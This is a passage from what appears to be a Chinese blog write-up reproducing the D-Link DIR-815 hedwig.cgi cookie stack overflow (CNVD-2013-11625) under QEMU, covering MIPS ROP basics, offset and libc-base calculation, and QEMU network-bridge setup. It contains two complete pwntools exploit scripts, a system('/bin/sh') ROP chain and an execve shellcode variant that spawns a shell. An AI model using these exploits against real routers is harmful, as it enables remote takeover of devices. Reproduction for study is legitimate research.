<p>通过调试我们可以知道这里的 <code>v9(v10, v16)</code> 其实就是调用了 <code>sub_409A6C函数</code><br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/31.png"><br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/32.png"></p>
<p>下面我们回到 <code>hedwigcgi_main函数</code> 在第50行处这里有一个 <code>cgibin_parse_request函数</code> 其中调用了 <code>sub_409A6C函数</code><br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/33.png"></p>
<p>进入到 <code>cgibin_parse_request</code> 之中<br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/34.png"><br>这里如果 <code>v9</code> 变成 <code>-1</code> 那么下面就没有办法执行  <code>return ((&amp;off_42C014)[3 * v16 - 1])(a1, a2, v7, &amp;v14[v17]);</code><br>也就是没有办法进入到 <code>sub_403b10函数</code> 那么也就没有办法在 <code>sub_403b10函数</code> 进入 <code>sub_402FFC函数</code> 当中去，所以环境变量<code>REQUEST_URI</code>中也必须有内容才行<br>在后续的exp中我们将这里的环境变量<code>CONTENT_TYPE</code>设置为<code>application/x-www-form-urlencoded</code><br>然后满足这些条件我们就可以利用到第二个 <code>sprintf函数</code> 了</p>
<p>如果是新手来复现熟悉一下过程的话只需要知道我们可以在exp中通过控制cookie的内容来打栈溢出就可以</p>
<h2 id="MIPS栈溢出的相关知识和工具"><a href="#MIPS栈溢出的相关知识和工具" class="headerlink" title="MIPS栈溢出的相关知识和工具"></a>MIPS栈溢出的相关知识和工具</h2><p>我们先来捋一下思路，程序什么保护都没有开启，所以我们可以直接 <code>打ROP链来获得shell</code>，还有就是 <code>MIPS架构</code> 是没办法开启 <code>NX保护</code> 的我们可以构造 <code>shellcode</code> 然后返回 <code>shellcode</code> 的地址执行</p>
<p>当然在实际应用中，最常用的还是通过 <code>ROP + shellcode</code> 的方式来 <code>getshell</code></p>
<h3 id="构造mips的rop寻找gadget所需的工具"><a href="#构造mips的rop寻找gadget所需的工具" class="headerlink" title="构造mips的rop寻找gadget所需的工具"></a><strong>构造mips的rop寻找gadget所需的工具</strong></h3><h4 id="mipsrop"><a href="#mipsrop" class="headerlink" title="mipsrop"></a>mipsrop</h4><p>安装方法:<a target="_blank" rel="noopener" href="https://blog.csdn.net/XiDPPython/article/details/148194489?spm=1001.2014.3001.5501">IDA插件 MIPSROP的安装和使用方法-CSDN博客</a><br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/35.png"></p>
<p>或者使用</p>
<h4 id="ropper"><a href="#ropper" class="headerlink" title="ropper"></a>ropper</h4><p><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/36.png"></p>
<p><code>感觉mipsrop更好用</code></p>
<h3 id="MIPS基础知识"><a href="#MIPS基础知识" class="headerlink" title="MIPS基础知识"></a><strong>MIPS基础知识</strong></h3><p>mips架构(32位下的mipsel)的特性</p>
<ol>
<li>叶子函数和非叶子函数<br><code>叶子函数</code> 是指<code>没有调用任何别子函数的函数</code>，它的返回地址会存放在 <code>$ra寄存器</code> 中，在叶子函数结束的时候程序会通过 <code>$ra寄存器</code> 进行跳转返回，如下图所示<br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/37.png"></li>
</ol>
<p><code>非叶子函数</code> 是指<code>调用了其他子函数的函数</code>， 它的返回地址 <code>$ra</code> 会在程序开始的时候通过 <code>sw指令</code> 存放到栈上，如下图所示<br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/38.png"><br>这是因为它其中调用了别的函数会改变它的 <code>$ra寄存器</code> 的值所以需要依靠栈来保存地址<br>然后在函数结束的时候再通过 <code>lw指令</code> 取出并跳转返回<br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/39.png"></p>
<ol start="2">
<li><p>流水线效应<br>最为常见的就是 <code>跳转指令</code> 比如 <code>jalr</code> 导致的 <code>分支延迟效应</code><br>而 <code>分支跳转语句</code> 后面的那条语句叫做 <code>分支延迟槽</code><br>就是说，当它跳转指令填充好跳转地址，但是还没来得及跳转过去的时候，跳转指令的下一条指令(分支延迟槽)就已经执行了<br>也就是说mips架构在执行跳转指令的时候<code>会先执行跳转指令的后一条指令，然后再进行跳转</code></p>
</li>
<li><p>缓存不一致性<br>指的是 <code>指令缓存区--Instruction Cache</code> 和 <code>数据缓存区--Data Cache</code> 的同步需要一定的时间<br>比如，我们将一段shellcode写入到栈上，那么此时shellcode还属于数据缓存区，如果我们直接跳转过去执行就会出现一些问题，因此我们需要调用一下 <code>sleep函数</code> 先停一下，让 <code>数据缓存区</code> 能够变成 <code>指令缓冲区</code> 然后再进行跳转这样就不会出错了，虽然直接跳转可能也不会出错但是sleep一下更加稳妥</p>
</li>
</ol>
<h2 id="使用qemu用户态模拟"><a href="#使用qemu用户态模拟" class="headerlink" title="使用qemu用户态模拟"></a><strong>使用qemu用户态模拟</strong></h2><h3 id="step1-测量偏移量"><a href="#step1-测量偏移量" class="headerlink" title="step1 测量偏移量"></a><strong>step1 测量偏移量</strong></h3><p>进入 <code>squashfs-root</code> 文件夹中<br>执行下面这条指令</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyclic <span class="number">2000</span> &gt; payload</span><br></pre></td></tr></table></figure>

<p>并且创建下面这个脚本并运行它</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">start.sh</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">定义输入数据和相关变量</span></span><br><span class="line">INPUT=&quot;XiDP=Pwner&quot;                          # 发送的数据内容</span><br><span class="line">LEN=$(echo -n &quot;$INPUT&quot; | wc -c)                 # 计算内容长度</span><br><span class="line">COOKIE=&quot;uid=`cat payload`&quot;   </span><br><span class="line"> </span><br><span class="line">echo $INPUT | qemu-mipsel -L ./ -0 &quot;hedwig.cgi&quot; -E REQUEST_METHOD=&quot;POST&quot; -E CONTENT_LENGTH=$LEN -E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; -E HTTP_COOKIE=$COOKIE -E REQUEST_URI=&quot;2333&quot; -g 1234 ./htdocs/cgibin</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-0 参数用于强制设置程序的 argv[0] 值， 后面的 -E 是设置环境变量了 -g 指定端口 <span class="built_in">echo</span> 可以实现post的功能</span></span><br></pre></td></tr></table></figure>

<p>开启 <code>另外一个终端</code>，创建下面这个脚本叫做 <code>mygdb.sh</code>, 然后执行指令 <code>gdb-multiarch -x mygdb.sh</code></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">mygdb.sh</span></span><br><span class="line">set architecture mips                                     </span><br><span class="line">set follow-fork-mode child  </span><br><span class="line">set detach-on-fork off                                    </span><br><span class="line">target remote 127.0.0.1:1234                                  </span><br></pre></td></tr></table></figure>

<p>如果我们没有搞错什么，那么我们将得到下面这幅画面<br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/40.png"></p>
<p>通过图中这个地址被修改的值我们可以计算出我们所需要的偏移量， 得到偏移量为1009<br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/41.png"></p>
<p>知道溢出量后我们还需要寻找libc的基地址</p>
<h3 id="step2-计算libc基地址"><a href="#step2-计算libc基地址" class="headerlink" title="step2 计算libc基地址"></a><strong>step2 计算libc基地址</strong></h3><p>这么我们是使用 <code>qemu用户态</code> 来模拟路由器程序，这时我们直接在 <code>pwndbg</code> 中使用 <code>vmmap指令</code> 是找不到 <code>libc_base</code> 的,大致会出现下图所示情况，我们在图中是看不到 <code>libc.so.0</code> 的初始地址的<br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/42.png"></p>
<p>所以我们需要在程序里面找到一个libc函数的真实地址，然后利用这个函数相对于libc基地址的偏移量来求出libc的基地址<br>我们在下面这两个地方打上断点，那么在跳转的时候我们就可以得知memset函数的真实地址了，而知道真实地址我们还需要memset函数相对于libc基地址的偏移量<br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/43.png"><br>(这里为什么选用两个memset函数? 这里因为第一次是跳转到延迟绑定的地址，第二次延迟绑定结束才是真实是memset函数地址)</p>
<p>下面使用gdb运行到此处查看memset的真实地址<br>第一次得到的是延迟绑定的地址，t9中存放<br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/44.png"><br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/45.png"></p>
<p>第二次得到的才是真实地址<br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/46.png"><br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/47.png"><br>由此可得，<code>memset函数</code> 的地址为 <code>0x2b333a20</code></p>
<p>然后我们查看软连接，发现程序的libc文件本体其实是 <code>libuClibc-0.9.30.1.so</code> 文件<br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/48.png"></p>
<p>将该文件拖入IDA中进行分析，得知 <code>memset</code> 的偏移量为 <code>0x034A20</code><br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/49.png"><br>下面就可以计算出 <code>libc_base = 0x2b333a20 - 0x034A20 = 0x2B2FF000</code><br>然后还可以找一下system函数的偏移量为 <code>0x53200</code></p>
<h3 id="step3-编写并运行exp"><a href="#step3-编写并运行exp" class="headerlink" title="step3 编写并运行exp"></a><strong>step3 编写并运行exp</strong></h3><p>接着我们就可以开始编写exp了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;mips&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc_base = <span class="number">0x2B2FF000</span> <span class="comment"># 这里的libc_base每个人都是不一样的需要修改</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">1009</span>-<span class="number">36</span>)</span><br><span class="line">payload += p32(libc_base + <span class="number">0x53200</span> - <span class="number">1</span>) <span class="comment"># s0  system_addr - 1</span></span><br><span class="line">payload += p32(libc_base + <span class="number">0x159F4</span>) <span class="comment"># s1  move $t9, $s0</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>                   <span class="comment">#s2</span></span><br><span class="line">payload += p32(libc_base + <span class="number">0x5A448</span>) <span class="comment"># s3  /bin/sh</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*(<span class="number">4</span>*<span class="number">2</span>)               <span class="comment">#s4-s5</span></span><br><span class="line">payload += p32(libc_base + <span class="number">0x32A98</span>) <span class="comment"># s6  addiu $s0, 1</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*(<span class="number">4</span>*<span class="number">2</span>)               <span class="comment">#s7-s8</span></span><br><span class="line">payload += p32(libc_base + <span class="number">0x13F8C</span>) <span class="comment"># ret_addr  move $a0, $s3</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;uid=&quot;</span> + payload</span><br><span class="line">post_content = <span class="string">&quot;XiDP=Pwner&quot;</span></span><br><span class="line">io = process(<span class="string">b&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    qemu-mipsel -L ./ \</span></span><br><span class="line"><span class="string">    -0 &quot;hedwig.cgi&quot; \</span></span><br><span class="line"><span class="string">    -E REQUEST_METHOD=&quot;POST&quot; \</span></span><br><span class="line"><span class="string">    -E CONTENT_LENGTH=10 \</span></span><br><span class="line"><span class="string">    -E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; \</span></span><br><span class="line"><span class="string">    -E HTTP_COOKIE=\&quot;&quot;&quot;&quot;</span> + payload + <span class="string">b&quot;&quot;&quot;\&quot; \</span></span><br><span class="line"><span class="string">    -E REQUEST_URI=&quot;2333&quot; \</span></span><br><span class="line"><span class="string">    -g 1234 ./htdocs/cgibin</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>, shell = <span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">io.send(post_content)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">.text:00013F8C                 move    $a0, $s3</span></span><br><span class="line"><span class="string">.text:00013F90                 move    $t9, $s6</span></span><br><span class="line"><span class="string">.text:00013F94                 jalr    $t9</span></span><br><span class="line"><span class="string">.text:00013F98                 move    $a1, $s1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">.text:000159F4                 move    $t9, $s0</span></span><br><span class="line"><span class="string">.text:000159F8                 jalr    $t9 ; mempcpy</span></span><br><span class="line"><span class="string">.text:000159FC                 addiu   $a1, (asc_599FC - 0x60000)  # &quot;/&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">.text:00032A98                 addiu   $s0, 1</span></span><br><span class="line"><span class="string">.text:00032A9C                 li      $s2, 1</span></span><br><span class="line"><span class="string">.text:00032AA0</span></span><br><span class="line"><span class="string">.text:00032AA0 loc_32AA0:                               # CODE XREF: sub_32850:loc_32A88↑j</span></span><br><span class="line"><span class="string">.text:00032AA0                 move    $t9, $s1</span></span><br><span class="line"><span class="string">.text:00032AA4                 jalr    $t9</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>上述所使用的exp为winmt师傅在其博客中所写，winmt师傅在博客中表示该exp无法打通qemu用户态，但是我本地打了一下发现如果直接打是无法打通的，但是如果加上一个pause，然后gdb-multiarch去连接，调试到最后却是可以打通的，如下图，有点怪，不知道啥原因<br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/50.png"></p>
<p>但是下面的shellcode版本是不论如何都可以打通的</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;mips&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">libc_base = <span class="number">0x2B2FF000</span> <span class="comment"># 这里的libc_base每个人都是不一样的需要修改</span></span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x3cd</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span></span><br><span class="line">payload += p32(libc_base + <span class="number">0x436D0</span>) <span class="comment"># s1  move $t9, $s3 (=&gt; lw... =&gt; jalr $t9)</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span></span><br><span class="line">payload += p32(libc_base + <span class="number">0x56BD0</span>) <span class="comment"># s3  sleep</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*(<span class="number">4</span>*<span class="number">5</span>)</span><br><span class="line">payload += p32(libc_base + <span class="number">0x57E50</span>) <span class="comment"># ra  li $a0, 1 (=&gt; jalr $s1)</span></span><br><span class="line"> </span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*(<span class="number">4</span>*<span class="number">4</span>)</span><br><span class="line">payload += p32(libc_base + <span class="number">0x37E6C</span>) <span class="comment"># s4  move  $t9, $a1 (=&gt; jalr $t9)</span></span><br><span class="line">payload += p32(libc_base + <span class="number">0x3B974</span>) <span class="comment"># ra  addiu $a1, $sp, 0x18 (=&gt; jalr $s4)</span></span><br><span class="line"> </span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    slti $a2, $zero, -1</span></span><br><span class="line"><span class="string">    li $t7, 0x69622f2f</span></span><br><span class="line"><span class="string">    sw $t7, -12($sp)</span></span><br><span class="line"><span class="string">    li $t6, 0x68732f6e</span></span><br><span class="line"><span class="string">    sw $t6, -8($sp)</span></span><br><span class="line"><span class="string">    sw $zero, -4($sp)</span></span><br><span class="line"><span class="string">    la $a0, -12($sp)</span></span><br><span class="line"><span class="string">    slti $a1, $zero, -1</span></span><br><span class="line"><span class="string">    li $v0, 4011</span></span><br><span class="line"><span class="string">    syscall 0x40404</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span></span><br><span class="line">payload += shellcode</span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&quot;uid=&quot;</span> + payload</span><br><span class="line">post_content = <span class="string">&quot;XiDP=Pwner&quot;</span></span><br><span class="line">io = process(<span class="string">b&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    qemu-mipsel -L ./ \</span></span><br><span class="line"><span class="string">    -0 &quot;hedwig.cgi&quot; \</span></span><br><span class="line"><span class="string">    -E REQUEST_METHOD=&quot;POST&quot; \</span></span><br><span class="line"><span class="string">    -E CONTENT_LENGTH=11 \</span></span><br><span class="line"><span class="string">    -E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; \</span></span><br><span class="line"><span class="string">    -E HTTP_COOKIE=\&quot;&quot;&quot;&quot;</span> + payload + <span class="string">b&quot;&quot;&quot;\&quot; \</span></span><br><span class="line"><span class="string">    -E REQUEST_URI=&quot;2333&quot; \</span></span><br><span class="line"><span class="string">    ./htdocs/cgibin</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>, shell = <span class="literal">True</span>)</span><br><span class="line">io.send(post_content)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>运行之后效果如下图所示<br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/51.png"></p>
<h2 id="使用qemu系统态模拟"><a href="#使用qemu系统态模拟" class="headerlink" title="使用qemu系统态模拟"></a>使用qemu系统态模拟</h2><h3 id="step1-下载对应内核及镜像"><a href="#step1-下载对应内核及镜像" class="headerlink" title="step1 下载对应内核及镜像"></a><strong>step1 下载对应内核及镜像</strong></h3><p>想要使用qemu系统态模拟相对就要复杂一点了，我们需要下载对应的 <code>内核</code> 以及 <code>镜像</code><br>下载地址: <a target="_blank" rel="noopener" href="https://people.debian.org/~aurel32/qemu/mipsel/">Index of &#x2F;~aurel32&#x2F;qemu&#x2F;mipsel</a><br>到上面这个网站下下 <code>debian_squeeze_mipsel_standard.qcow2</code>镜像以及 <code>vmlinux-3.2.0-4-4kc-malta</code> 内核<br>如下图所示<br><img src="/../picture/DIR-815%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/52.png"></p>
<h3 id="step2-创建网桥"><a href="#step2-创建网桥" class="headerlink" title="step2 创建网桥"></a><strong>step2 创建网桥</strong></h3><p>开始模拟之前我们需要开启物理机的ip转发功能，以及创建网桥来连接到<code>qemu</code>虚拟机</p>
<p>首先安装网络配置工具</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install bridge-utils uml-utilities</span><br></pre></td></tr></table></figure>

<p>然后修改 <code>interfaces</code> 文件</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/network/interfaces</span><br></pre></td></tr></table></figure>
<p>一些新版本的Ubuntu里面可能没有 <code>interfaces</code> 这个问题<br>我们可以使用下面指令来安装</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install ifupdown</span><br></pre></td></tr></table></figure>

<p>修改 <code>interfaces</code> 文件内容如下(修改之前可以先备份一份， <code>sudo cp /etc/network/interfaces /etc/network/interfaces.brk</code>)<br>下面使用 <code>ip addr</code> 指令来查看我们系统使用的是什么接口 一般是 <code>eth0</code> 或 <code>ens33</code></p>
<p>eth0如下:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">auto</span> lo</span><br><span class="line">iface lo inet loopback</span><br><span class="line"> </span><br><span class="line"><span class="keyword">auto</span> eth0</span><br><span class="line">iface eth0 inet dhcp</span><br><span class="line">up ifconfig eth0 <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> up</span><br><span class="line"> </span><br><span class="line"><span class="keyword">auto</span> br0</span><br><span class="line">iface br0 inet dhcp</span><br><span class="line"> </span><br><span class="line">bridge_ports eth0</span><br><span class="line">bridge_maxwait <span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>ens33如下:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">auto</span> lo</span><br><span class="line">iface lo inet loopback</span><br><span class="line"> </span><br><span class="line"><span class="keyword">auto</span> ens33</span><br><span class="line">iface ens33 inet dhcp</span><br><span class="line">up ifconfig ens33 <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> up</span><br><span class="line"> </span><br><span class="line"><span class="keyword">auto</span> br0</span><br><span class="line">iface br0 inet dhcp</span><br><span class="line"> </span><br><span class="line">bridge_ports ens33</span><br><span class="line">bridge_maxwait <span class="number">0</span></span><br></pre></td></tr></table></figure>
<p>这里修改完之后可以使用指令 <code>sudo /etc/init.d/networking restart</code> 来重启一下网络配置<br>再备份一次 <code>sudo cp /etc/network/interfaces /etc/network/interfaces.brk2</code><br>备份好之后我们可以写一个脚本用来在两个不同的版本之间切换<br>我写的脚本如下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># net_cg </span></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 功能说明：切换网络配置文件并重启服务</span></span><br><span class="line"><span class="comment"># 用法：net_cg [0|1]</span></span><br><span class="line"><span class="comment"># 参数：0 - 使用 interfaces.brk；1 - 使用 interfaces.brk2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;<span class="variable">$1</span>&quot;</span> <span class="keyword">in</span></span><br><span class="line">    0)</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;正在切换至 interfaces.brk 配置...&quot;</span></span><br><span class="line">        <span class="built_in">sudo</span> <span class="built_in">rm</span> /etc/network/interfaces</span><br><span class="line">        <span class="built_in">sudo</span> <span class="built_in">cp</span> /etc/network/interfaces.brk /etc/network/interfaces</span><br><span class="line">        <span class="built_in">sudo</span> /etc/init.d/networking restart</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;配置切换完成！&quot;</span></span><br><span class="line">        ;;</span><br><span class="line">    1)</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;正在切换至 interfaces.brk2 配置...&quot;</span></span><br><span class="line">        <span class="built_in">sudo</span> <span class="built_in">rm</span> /etc/network/interfaces</span><br><span class="line">        <span class="built_in">sudo</span> <span class="built_in">cp</span> /etc/network/interfaces.brk2 /etc/network/interfaces</span><br><span class="line">        <span class="built_in">sudo</span> /etc/init.d/networking restart</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;配置切换完成！&quot;</span></span><br><span class="line">        ;;</span><br><span class="line">    <span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="comment"># 无参数时提示用法</span></span><br><span class="line">        <span class="built_in">echo</span> 